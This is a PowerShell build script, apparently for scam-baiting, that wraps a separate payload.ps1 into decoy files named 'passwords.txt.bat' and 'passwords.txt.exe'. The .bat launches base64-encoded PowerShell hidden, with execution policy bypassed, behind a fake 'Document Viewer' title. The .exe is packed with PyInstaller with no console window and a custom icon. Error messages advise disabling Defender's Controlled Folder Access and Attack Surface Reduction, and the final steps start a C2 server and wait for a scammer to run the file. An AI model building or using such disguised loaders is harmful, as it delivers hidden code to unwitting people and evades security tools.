# Build Anytime Payload
# Generates passwords.txt.bat and passwords.txt.exe
# Usage: .\build.ps1 [bat|exe|both]

param([string]$Target = "both")

Write-Host ""
Write-Host "======================================"
Write-Host "  Anytime Payload Builder"
Write-Host "======================================"
Write-Host ""

# ============================================
# BUILD .BAT VERSION
# ============================================

if ($Target -eq "bat" -or $Target -eq "both") {
    Write-Host "Building passwords.txt.bat..."
    
    if (!(Test-Path "payload.ps1")) {
        Write-Host "ERROR: payload.ps1 not found!" -ForegroundColor Red
        exit 1
    }
    
    # Read payload
    $payload = Get-Content "payload.ps1" -Raw -Encoding UTF8
    
    # Encode to UTF-16LE and Base64
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
    $base64 = [Convert]::ToBase64String($bytes)
    
    # Create .bat wrapper
    $bat = @"
@echo off
title Document Viewer
echo Loading document...

powershell.exe -W Hidden -NoP -EP Bypass -NonI -E $base64

echo Complete.
exit
"@
    
    Write-Host ""
    Write-Host "  Generated .bat content:" -ForegroundColor Cyan
    Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
    Write-Host $bat -ForegroundColor Gray
    Write-Host "  ----------------------------------------" -ForegroundColor DarkGray
    Write-Host ""
    
    try {
        $batPath = Join-Path $PWD "passwords.txt.bat"
        Write-Host "  DEBUG: Writing to: $batPath" -ForegroundColor Cyan
        
        [System.IO.File]::WriteAllText($batPath, $bat, [System.Text.Encoding]::ASCII)
        Write-Host "  DEBUG: Write completed without errors" -ForegroundColor Cyan
        
        # Check immediately
        if (Test-Path $batPath) {
            Write-Host "  DEBUG: File exists immediately after write" -ForegroundColor Cyan
            Start-Sleep -Milliseconds 500
            
            if (Test-Path $batPath) {
                $fileInfo = Get-Item $batPath
                Write-Host "  -> passwords.txt.bat created (Size: $($fileInfo.Length) bytes)" -ForegroundColor Green
            } else {
                Write-Host "  ERROR: File existed but was deleted within 500ms!" -ForegroundColor Red
                Write-Host "  CAUSE: Defender (or another security tool) quarantined it after creation" -ForegroundColor Red
                Write-Host "  ACTION: Check Windows Security -> Protection History for details" -ForegroundColor Yellow
            }
        } else {
            Write-Host "  ERROR: File never appeared on disk (write intercepted)" -ForegroundColor Red
            Write-Host "  CAUSE: Write operation blocked by Controlled Folder Access or ASR rules" -ForegroundColor Red
            Write-Host "  ACTION: Disable Controlled Folder Access and Attack Surface Reduction" -ForegroundColor Yellow
        }
    } catch {
        Write-Host "  ERROR: Write operation threw exception: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  CAUSE: Insufficient permissions or file system error" -ForegroundColor Red
        Write-Host "  ACTION: Run PowerShell as Administrator" -ForegroundColor Yellow
    }
}

# ============================================
# BUILD .EXE VERSION
# ============================================

if ($Target -eq "exe" -or $Target -eq "both") {
    Write-Host ""
    Write-Host "Building passwords.txt.exe..."
    
    # Check required files
    if (!(Test-Path "launcher.py")) {
        Write-Host "ERROR: launcher.py not found!" -ForegroundColor Red
        exit 1
    }
    if (!(Test-Path "payload.ps1")) {
        Write-Host "ERROR: payload.ps1 not found!" -ForegroundColor Red
        exit 1
    }
    if (!(Test-Path "icon.ico")) {
        Write-Host "ERROR: icon.ico not found!" -ForegroundColor Red
        exit 1
    }
    
    # Find Python
    $python = "python"
    if (!(Get-Command python -ErrorAction SilentlyContinue)) {
        $python = "python3"
        if (!(Get-Command python3 -ErrorAction SilentlyContinue)) {
            Write-Host "ERROR: Python not found!" -ForegroundColor Red
            exit 1
        }
    }
    
    # Check PyInstaller
    & $python -m pip show pyinstaller >$null 2>&1
    if ($LASTEXITCODE -ne 0) {
        Write-Host "  PyInstaller not found. Installing..." -ForegroundColor Yellow
        & $python -m pip install pyinstaller
        if ($LASTEXITCODE -ne 0) {
            Write-Host "ERROR: Failed to install PyInstaller" -ForegroundColor Red
            exit 1
        }
    }
    
    # Determine separator (Windows uses ;, others use :)
    $sep = if ($IsWindows -or $env:OS -match "Windows") { ";" } else { ":" }
    
    # Build with PyInstaller
    & $python -m PyInstaller `
        --onefile `
        --noconsole `
        --icon=icon.ico `
        --name=passwords.txt `
        --add-data="payload.ps1$sep." `
        --clean `
        launcher.py
    
    if ($LASTEXITCODE -ne 0) {
        Write-Host "ERROR: Build failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host "  -> dist\passwords.txt.exe created" -ForegroundColor Green
    
    # Clean up
    if (Test-Path "build") { Remove-Item "build" -Recurse -Force }
    if (Test-Path "__pycache__") { Remove-Item "__pycache__" -Recurse -Force }
    Write-Host "  -> Build artifacts cleaned" -ForegroundColor Gray
}

# ============================================
# DONE
# ============================================

Write-Host ""
Write-Host "======================================"
Write-Host "  Build Complete!"
Write-Host "======================================"
Write-Host ""
Write-Host "Next steps:"
Write-Host "  1. Start C2 server: cd ..\sender && python sender.py"
Write-Host "  2. Deploy payload to honeypot VM"
Write-Host "  3. Wait for scammer to execute"
Write-Host ""
